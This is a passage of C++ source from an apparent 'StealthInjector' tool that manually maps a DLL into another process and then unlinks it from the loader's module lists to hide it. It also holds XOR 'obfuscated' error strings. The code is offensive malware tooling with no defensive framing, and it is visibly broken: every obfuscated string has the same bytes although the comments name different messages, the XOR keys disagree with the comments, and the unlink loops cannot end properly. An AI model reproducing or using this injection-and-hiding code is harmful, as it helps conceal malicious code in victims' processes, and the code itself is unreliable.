                obfuscatedString[i] = obfuscatedString[i] ^ 0xDF;
            }
            return obfuscatedString;
        }
        case 24:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'LoadLib: Failed to allocate remote buffer' with 0xDF
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE0;
            }
            return obfuscatedString;
        }
        case 25:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'LoadLib: Failed to write DLL path to remote process' with 0xE0
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE1;
            }
            return obfuscatedString;
        }
        case 26:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'LoadLib: Failed to get address of LoadLibraryW' with 0xE1
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE2;
            }
            return obfuscatedString;
        }
        case 27:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'LoadLib: Failed to create remote thread' with 0xE2
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE3;
            }
            return obfuscatedString;
        }
        case 28:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'LoadLib: DLL injection failed' with 0xE3
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE4;
            }
            return obfuscatedString;
        }
        case 29:
          {
             std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'LoadLib: Successfully injected DLL' with 0xE4
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE5;
            }
            return obfuscatedString;
        }
        case 60:
        {
            std::wstring obfuscatedString = L"\x2C\x27\x20\x20\x21\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'SetHook: Manual Mapping failed for DLL: ' with 0x55
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE5;
            }
            return obfuscatedString;
        }
        case 61:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'Failed to get NtQueryInformationProcess' with 0xE6
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE6;
            }
            return obfuscatedString;
        }
        case 62:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'Failed to get PROCESS_BASIC_INFORMATION' with 0xE7
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE7;
            }
            return obfuscatedString;
        }
        case 47:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'Failed to read PEB' with 0xE8
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE8;
            }
            return obfuscatedString;
        }
        case 48:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'Failed to read InLdrModuleList' with 0xE9
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE9;
            }
            return obfuscatedString;
        }

    }
}

// Shellcode to be executed in the remote process
// This function will be executed in the remote process
// It's responsible for calling DllMain, fixing relocations, and resolving imports.
// Now, it will also handle PEB unlinking.
DWORD WINAPI Shellcode(StealthInjector::PMANUAL_MAPPING_DATA pData) {
    if (!pData) {
        return 1; // Invalid data
    }

    // Perform base relocations
    PIMAGE_BASE_RELOCATION pRelocationBlock = (PIMAGE_BASE_RELOCATION)((BYTE*)pData->pModuleBase + ((PIMAGE_NT_HEADERS)((BYTE*)pData->pModuleBase + ((PIMAGE_DOS_HEADER)pData->pModuleBase)->e_lfanew))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    ULONG_PTR dwDelta = (ULONG_PTR)pData->pModuleBase - (ULONG_PTR)(((PIMAGE_NT_HEADERS)((BYTE*)pData->pModuleBase + ((PIMAGE_DOS_HEADER)pData->pModuleBase)->e_lfanew))->OptionalHeader.ImageBase);

    while (pRelocationBlock->VirtualAddress) {
        PWORD pRelocationEntry = (PWORD)((BYTE*)pRelocationBlock + sizeof(IMAGE_BASE_RELOCATION));
        for (UINT i = 0; i < (pRelocationBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); i++) {
            if (pRelocationEntry[i]) {
                *(DWORD*)((BYTE*)pData->pModuleBase + pRelocationBlock->VirtualAddress + (pRelocationEntry[i] & 0xFFF)) += (DWORD)dwDelta;
            }
        }
        pRelocationBlock = (PIMAGE_BASE_RELOCATION)((BYTE*)pRelocationBlock + pRelocationBlock->SizeOfBlock);
    }

    // Resolve imports
    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pData->pModuleBase + ((PIMAGE_NT_HEADERS)((BYTE*)pData->pModuleBase + ((PIMAGE_DOS_HEADER)pData->pModuleBase)->e_lfanew))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // Manually resolve LoadLibraryA and GetProcAddress

    // Get base address of kernel32.dll
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    StealthInjector::PLDR_DATA_TABLE_ENTRY pLdrEntry = (StealthInjector::PLDR_DATA_TABLE_ENTRY)pPeb->Ldr->InMemoryOrderModuleList.Flink;

    while (pLdrEntry->DllBase) {
        if (pLdrEntry->BaseDllName.Length == 24 &&
            *(ULONG*)pLdrEntry->BaseDllName.Buffer == 'nrek' &&
            *(ULONG*)((BYTE*)pLdrEntry->BaseDllName.Buffer + 4) == '32le' &&
            *(ULONG*)((BYTE*)pLdrEntry->BaseDllName.Buffer + 8) == '.lld') { // kernel32.dll
            
            // Found kernel32.dll
            pData->pLoadLibraryA = (StealthInjector::f_LoadLibraryA)((StealthInjector::f_GetProcAddress)pData->pGetProcAddress((HMODULE)pLdrEntry->DllBase, "LoadLibraryA"));
            pData->pGetProcAddress = (StealthInjector::f_GetProcAddress)((StealthInjector::f_GetProcAddress)pData->pGetProcAddress((HMODULE)pLdrEntry->DllBase, "GetProcAddress"));
            break;
        }
        pLdrEntry = (StealthInjector::PLDR_DATA_TABLE_ENTRY)pLdrEntry->InMemoryOrderLinks.Flink;
    }

    if (!pData->pLoadLibraryA || !pData->pGetProcAddress) {
        return 3; // Failed to resolve LoadLibraryA or GetProcAddress
    }

    while (pImportDescriptor->Name) {
        LPCSTR lpszModuleName = (LPCSTR)((BYTE*)pData->pModuleBase + pImportDescriptor->Name);
        HMODULE hMod = pData->pLoadLibraryA(lpszModuleName);

        if (!hMod) {
            return 2; // Failed to load module
        }

        PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)pData->pModuleBase + pImportDescriptor->OriginalFirstThunk);
        PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)pData->pModuleBase + pImportDescriptor->FirstThunk);

        while (pOriginalFirstThunk->u1.AddressOfData) {
            if (pOriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                // Import by ordinal
                pFirstThunk->u1.Function = (ULONG_PTR)((StealthInjector::f_GetProcAddress)pData->pGetProcAddress((HMODULE)hMod, (LPCSTR)(pOriginalFirstThunk->u1.Ordinal & 0xFFFF)));
            } else {
                // Import by name
                PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pData->pModuleBase + pOriginalFirstThunk->u1.AddressOfData);
                pFirstThunk->u1.Function = (ULONG_PTR)((StealthInjector::f_GetProcAddress)pData->pGetProcAddress((HMODULE)hMod, (LPCSTR)pImportByName->Name));
            }
            pOriginalFirstThunk++;
            pFirstThunk++;
        }
        pImportDescriptor++;
    }

    // Call DllMain
    if (pData->pDllMain) {
        ((StealthInjector::f_DLL_ENTRY_POINT)pData->pDllMain)((HMODULE)pData->pModuleBase, DLL_PROCESS_ATTACH, nullptr);
    }

    // PEB Unlinking
    // Get the PEB_LDR_DATA structure
    StealthInjector::PPEB_LDR_DATA pLdr = (StealthInjector::PPEB_LDR_DATA)pPeb->Ldr;

    // Iterate through the module lists and unlink the injected DLL
    for (LIST_ENTRY* pListHead = &pLdr->InLoadOrderModuleList; pListHead != nullptr; pListHead = pListHead->Flink) {
        StealthInjector::PLDR_DATA_TABLE_ENTRY pEntry = (StealthInjector::PLDR_DATA_TABLE_ENTRY)((BYTE*)pListHead - offsetof(StealthInjector::LDR_DATA_TABLE_ENTRY, InLoadOrderLinks));
        if (pEntry->DllBase == pData->pModuleBase) {
            pEntry->InLoadOrderLinks.Blink->Flink = pEntry->InLoadOrderLinks.Flink;
            pEntry->InLoadOrderLinks.Flink->Blink = pEntry->InLoadOrderLinks.Blink;
            break;
        }
    }

    for (LIST_ENTRY* pListHead = &pLdr->InMemoryOrderModuleList; pListHead != nullptr; pListHead = pListHead->Flink) {
        StealthInjector::PLDR_DATA_TABLE_ENTRY pEntry = (StealthInjector::PLDR_DATA_TABLE_ENTRY)((BYTE*)pListHead - offsetof(StealthInjector::LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
        if (pEntry->DllBase == pData->pModuleBase) {
            pEntry->InMemoryOrderLinks.Blink->Flink = pEntry->InMemoryOrderLinks.Flink;
            pEntry->InMemoryOrderLinks.Flink->Blink = pEntry->InMemoryOrderLinks.Blink;
            break;
        }
    }

    for (LIST_ENTRY* pListHead = &pLdr->InInitializationOrderModuleList; pListHead != nullptr; pListHead = pListHead->Flink) {
        StealthInjector::PLDR_DATA_TABLE_ENTRY pEntry = (StealthInjector::PLDR_DATA_TABLE_ENTRY)((BYTE*)pListHead - offsetof(StealthInjector::LDR_DATA_TABLE_ENTRY, InInitializationOrderLinks));
        if (pEntry->DllBase == pData->pModuleBase) {
            pEntry->InInitializationOrderLinks.Blink->Flink = pEntry->InInitializationOrderLinks.Flink;
            pEntry->InInitializationOrderLinks.Flink->Blink = pEntry->InInitializationOrderLinks.Blink;
            break;
        }
    }

    return 0; // Success
}
